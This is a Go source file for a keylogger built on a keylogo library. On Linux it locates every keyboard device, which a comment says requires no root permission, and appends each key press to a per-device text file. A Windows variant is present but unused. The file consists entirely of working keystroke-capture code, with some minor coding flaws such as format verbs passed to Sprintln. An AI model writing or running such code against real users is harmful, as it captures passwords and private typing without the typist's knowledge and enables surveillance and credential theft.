package main

import (
	"errors"
	"fmt"
	"github.com/mateusmaaia/keylogo/linux/keylogger"
	"github.com/mateusmaaia/keylogo/linux/mapping"
	"github.com/mateusmaaia/keylogo/windows"
	"github.com/sirupsen/logrus"
	"os"
	"regexp"
	"runtime"
	"time"
)

func main() {

	switch runtime.GOOS {
	case "linux":
		LinuxKeylogger()
	case "windows":
		return
	}

	runtime.Goexit()
	fmt.Println("Stopping keylogger")
}

func WindowsKeyLogger() {
	kl := windows.NewKeylogger()
	emptyCount := 0
	f := openOrCreateFile("windows")

	for {

		key := kl.GetKey()

		if !key.Empty {
			f.WriteString(fmt.Sprintln("'%c' %d n", key.Rune, key.Keycode))
		}

		emptyCount++

		time.Sleep(1 * time.Millisecond)
	}
}

func LinuxKeylogger() {
	// find keyboard device, does not require a root permission
	keyboards := keylogger.FindAllKeyboardDevices()

	// check if we found a path to keyboard
	if len(keyboards) <= 0 {
		logrus.Fatalf("No keyboard found... finishing keylogger")
	}

	logrus.Println("Found a possible keyboards at", keyboards)

	for _, keyboard := range keyboards {
		go loggingLinuxKeyboard(keyboard)
	}
}

var keyboardNameReg = regexp.MustCompile(`(?m)([^/]+$)`)

func loggingLinuxKeyboard(keyboard string) {
	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}

	keyboardName := fmt.Sprintf("%s.txt", keyboardNameReg.FindAllString(keyboard, 1))
	f := openOrCreateFile(keyboardName)

	go cleanNoKeyboard(k, keyboardName, 2*time.Minute)

	in := k.Read()
	if err != nil {
		fmt.Println(err)
		return
	}

	for i := range in {
		if i.Type == mapping.EvKey && i.KeyPress() {
			f.WriteString(fmt.Sprintln(i.KeyString()))
		}
	}
}

func fileExists(name string) (bool, error) {
	_, err := os.Stat(name)
	if err == nil {
		return true, nil
	}
	if errors.Is(err, os.ErrNotExist) {
		return false, nil
	}
	return false, err
}

func openOrCreateFile(keyboardName string) *os.File {
	if ok, _ := fileExists(keyboardName); !ok {
		f, _ := os.Create(keyboardName)

		return f
	}

	mode := int(0644)
	fMode := os.FileMode(mode)
	f, _ := os.OpenFile(keyboardName, os.O_APPEND, fMode)

	return f
}

func cleanNoKeyboard(k *keylogger.KeyLogger, fileName string, timeout time.Duration) {
	select {
	case <-time.After(timeout):
		if f, _ := os.Stat(fileName); f.Size() < 2 {
			os.Remove(fileName)
			k.Close()
		}

		break
	}
}
